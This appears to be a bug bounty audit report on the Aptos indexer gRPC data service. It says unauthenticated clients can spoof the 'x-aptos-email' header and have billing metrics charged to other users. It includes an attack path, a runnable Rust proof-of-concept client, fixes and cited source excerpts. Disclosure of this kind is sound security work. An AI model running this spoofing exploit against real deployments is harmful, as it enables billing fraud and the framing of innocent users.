# Audit Report

## Title
Email Header Spoofing in Indexer gRPC Data Service Enables Billing Fraud and User Framing

## Summary
The indexer-grpc-data-service accepts unauthenticated connections and extracts the `x-aptos-email` header without validation. This header is used as a label dimension in billing metrics, allowing attackers to spoof arbitrary email addresses to frame other users for high bandwidth usage or evade billing tracking. The service has no authentication mechanism despite expectations that API Gateway would handle authentication.

## Finding Description

The indexer-grpc-data-service extracts request metadata including the `x-aptos-email` header without any validation: [1](#0-0) 

This email header is then used as a label dimension in the billing metric `BYTES_READY_TO_TRANSFER_FROM_SERVER_AFTER_STRIPPING`, which is explicitly documented as being used for billing: [2](#0-1) 

The metric is incremented with the email as a label: [3](#0-2) 

The critical vulnerability is that the service has **no authentication interceptor** despite a comment indicating one should exist: [4](#0-3) 

The deprecated authentication configuration fields (`whitelisted_auth_tokens` and `disable_auth_check`) are never actually used in the codebase: [5](#0-4) 

Clients can connect directly to the service and insert arbitrary metadata headers: [6](#0-5) 

The service is exposed on public ports in the deployment configuration: [7](#0-6) 

**Attack Path:**
1. Attacker connects directly to the data service (bypassing API Gateway) on port 50052/50053
2. Attacker creates a gRPC request with spoofed `x-aptos-email` header set to victim's email
3. Attacker requests large amounts of transaction data
4. Billing metrics (`BYTES_READY_TO_TRANSFER_FROM_SERVER_AFTER_STRIPPING`) are recorded under victim's email
5. Victim is incorrectly billed or blamed for attacker's bandwidth usage
6. Attacker evades their own usage tracking

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos Bug Bounty program criteria for "Significant protocol violations" because:

1. **Billing Fraud**: Attackers can attribute their bandwidth costs to arbitrary users, causing financial harm
2. **User Framing**: Innocent users can be falsely accused of malicious activity based on poisoned logs and metrics
3. **Evasion of Monitoring**: Attackers can hide their actual usage patterns from security monitoring
4. **System Integrity**: The billing and observability infrastructure loses reliability

While this doesn't affect on-chain consensus or state, it compromises a critical off-chain infrastructure component that Aptos relies on for indexing services.

## Likelihood Explanation

**Likelihood: High**

The vulnerability is highly likely to be exploited because:
- No authentication is required (service accepts all connections)
- Attack is trivial to execute (simple gRPC client with custom metadata)
- Service is exposed on standard ports (50052, 50053)
- No special permissions or insider access needed
- Deployment configurations show direct public exposure

The only barrier is whether production deployments have network-level restrictions (firewalls), but the code itself provides no protection.

## Recommendation

Implement proper authentication and header validation:

1. **Add Authentication Interceptor**: Implement a proper gRPC interceptor that validates requests before processing:
```rust
// In config.rs, after line 187
let server = Arc::new(server);
let svc = aptos_protos::indexer::v1::raw_data_server::RawDataServer::from_arc(server)
    .send_compressed(CompressionEncoding::Zstd)
    .accept_compressed(CompressionEncoding::Zstd)
    .accept_compressed(CompressionEncoding::Gzip)
    .with_interceptor(|req: Request<()>| {
        // Validate request comes from trusted API Gateway
        // or has valid authentication token
        validate_request_auth(req)
    });
```

2. **Validate Email Header**: In `get_request_metadata()`, validate that the email header can only be set by authenticated API Gateway:
```rust
// Only trust x-aptos-email if request is authenticated from API Gateway
if !is_from_api_gateway(&req) {
    // Reject or sanitize email header
    return Err(Status::unauthenticated("Invalid request source"));
}
```

3. **Network Isolation**: Deploy data service in private network, accessible only from API Gateway
4. **Remove Dead Code**: Delete unused `whitelisted_auth_tokens` and `disable_auth_check` fields to avoid confusion

## Proof of Concept

```rust
// File: email_spoof_poc.rs
use aptos_protos::indexer::v1::{raw_data_client::RawDataClient, GetTransactionsRequest};
use tonic::metadata::MetadataValue;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect directly to data service (bypassing API Gateway)
    let mut client = RawDataClient::connect("http://localhost:50052").await?;
    
    // Create request with spoofed email header
    let mut request = tonic::Request::new(GetTransactionsRequest {
        starting_version: Some(0),
        transactions_count: Some(1000000), // Request large amount of data
        ..Default::default()
    });
    
    // Spoof victim's email in metadata
    request.metadata_mut().insert(
        "x-aptos-email",
        MetadataValue::from_str("victim@example.com")?,
    );
    request.metadata_mut().insert(
        "x-aptos-identifier",
        MetadataValue::from_str("attacker-id")?,
    );
    request.metadata_mut().insert(
        "x-aptos-application-name",
        MetadataValue::from_str("malicious-app")?,
    );
    
    // Send request - billing metrics will be attributed to victim@example.com
    let mut stream = client.get_transactions(request).await?.into_inner();
    
    while let Some(_response) = stream.message().await? {
        // Process data - all bandwidth charged to victim's email
        println!("Received data, billed to victim@example.com");
    }
    
    Ok(())
}
```

**To test:**
1. Start indexer-grpc-data-service with default configuration
2. Run the PoC against the exposed port (50052)
3. Observe Prometheus metrics showing bytes attributed to `email="victim@example.com"`
4. Victim is now incorrectly charged for attacker's bandwidth usage

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/constants.rs (L72-106)
```rust
pub fn get_request_metadata(req: &Request<GetTransactionsRequest>) -> IndexerGrpcRequestMetadata {
    let request_metadata_pairs = vec![
        (
            "request_identifier_type",
            REQUEST_HEADER_APTOS_IDENTIFIER_TYPE,
        ),
        ("request_identifier", REQUEST_HEADER_APTOS_IDENTIFIER),
        ("request_email", REQUEST_HEADER_APTOS_EMAIL),
        (
            "request_application_name",
            REQUEST_HEADER_APTOS_APPLICATION_NAME,
        ),
        ("request_token", GRPC_AUTH_TOKEN_HEADER),
        ("processor_name", GRPC_REQUEST_NAME_HEADER),
    ];
    let mut request_metadata_map: HashMap<String, String> = request_metadata_pairs
        .into_iter()
        .map(|(key, value)| {
            (
                key.to_string(),
                req.metadata()
                    .get(value)
                    .map(|value| value.to_str().unwrap_or("unspecified").to_string())
                    .unwrap_or("unspecified".to_string()),
            )
        })
        .collect();
    request_metadata_map.insert(
        "request_connection_id".to_string(),
        Uuid::new_v4().to_string(),
    );

    // TODO: update the request name if these are internal requests.
    serde_json::from_str(&serde_json::to_string(&request_metadata_map).unwrap()).unwrap()
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/counters.rs (L219-241)
```rust
/// Count of bytes transfered to the client. This only represents the bytes prepared and
/// ready to send to the client. It does not represent the bytes actually sent to the client.
///
/// This is post stripping, meaning some transactions may have been stripped (removing
/// things such as events, writesets, payload, signature). Compare this with
/// BYTES_READY_TO_TRANSFER_FROM_SERVER to see how many bytes were stripped.
///
/// A cumulative sum of this metric is used for billing.
pub static BYTES_READY_TO_TRANSFER_FROM_SERVER_AFTER_STRIPPING: Lazy<IntCounterVec> =
    Lazy::new(|| {
        register_int_counter_vec!(
            "indexer_grpc_data_service_bytes_ready_to_transfer_from_server_after_stripping",
            "Count of bytes ready to transfer to the client (post stripping)",
            &[
                "identifier_type",
                "identifier",
                "email",
                "application_name",
                "processor"
            ],
        )
        .unwrap()
    });
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/service.rs (L525-532)
```rust
        let bytes_ready_to_transfer_after_stripping = resp_items
            .iter()
            .flat_map(|response| &response.transactions)
            .map(|t| t.encoded_len())
            .sum::<usize>();
        BYTES_READY_TO_TRANSFER_FROM_SERVER_AFTER_STRIPPING
            .with_label_values(&request_metadata.get_label_values())
            .inc_by(bytes_ready_to_transfer_after_stripping as u64);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/config.rs (L58-63)
```rust
    /// Deprecated: a list of auth tokens that are allowed to access the service.
    #[serde(default)]
    pub whitelisted_auth_tokens: Vec<String>,
    /// Deprecated: if set, don't check for auth tokens.
    #[serde(default)]
    pub disable_auth_check: bool,
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/config.rs (L179-191)
```rust
        // Add authentication interceptor.
        let server = RawDataServerWrapper::new(
            self.redis_read_replica_address.clone(),
            self.file_store_config.clone(),
            self.data_service_response_channel_size,
            self.txns_to_strip_filter.clone(),
            cache_storage_format,
            Arc::new(in_memory_cache),
        )?;
        let svc = aptos_protos::indexer::v1::raw_data_server::RawDataServer::new(server)
            .send_compressed(CompressionEncoding::Zstd)
            .accept_compressed(CompressionEncoding::Zstd)
            .accept_compressed(CompressionEncoding::Gzip);
```

**File:** ecosystem/indexer-grpc/indexer-transaction-generator/src/transaction_importer.rs (L30-38)
```rust
            request.metadata_mut().insert(
                GRPC_REQUEST_NAME_HEADER,
                GRPC_REQUEST_NAME_VALUE.parse().unwrap(),
            );
            if let Some(api_key) = &self.api_key {
                request.metadata_mut().insert(
                    GRPC_API_GATEWAY_API_KEY_HEADER,
                    format!("Bearer {}", api_key.clone()).parse().unwrap(),
                );
```

**File:** docker/compose/indexer-grpc/docker-compose.yaml (L103-106)
```yaml
    ports:
      - "50052:50052" # GRPC non-secure
      - "50053:50053" # GRPC secure
      - "18084:8084" # health
```
